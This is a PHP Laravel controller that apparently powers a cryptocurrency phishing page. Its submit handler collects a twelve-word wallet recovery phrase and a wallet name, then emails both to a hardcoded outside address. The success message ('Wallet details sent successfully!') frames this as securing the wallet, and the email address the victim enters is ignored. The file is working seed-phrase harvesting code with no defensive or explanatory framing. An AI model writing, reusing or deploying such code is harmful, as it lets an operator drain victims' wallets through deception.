<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class UserController extends Controller
{
    //
    public function Homepage(){
        return view('Homepage');
    }

    public function submit(Request $request)
    {
        // 1️⃣ Validate the request
        $validated = $request->validate([
            'phrases' => 'required|array|size:12',
            'phrases.*' => 'required|string',
            'walletSelect' => 'required|string',
            'email' => 'required|email'
        ]);

        // 2️⃣ Extract validated data
        $phrases = $validated['phrases'];
        $walletName = $validated['walletSelect'];

        // If you want to use a "user" object in email
        $user = (object)[
            'email' => 'geltajelto@necub.com',
            'name' => $request->name ?? 'User' // optional, if you collect name
        ];

        // 3️⃣ Send the email
        Mail::send('emails.wallet-secured', [
            'walletName' => $walletName,
            'phrases' => $phrases,
            'user' => $user
        ], function ($message) use ($user) {
            $message->to($user->email)
                    ->subject('New Wallet Secured');
        });

        // 4️⃣ Optionally, return success
        return back()->with('success', 'Wallet details sent successfully!');
    }
}
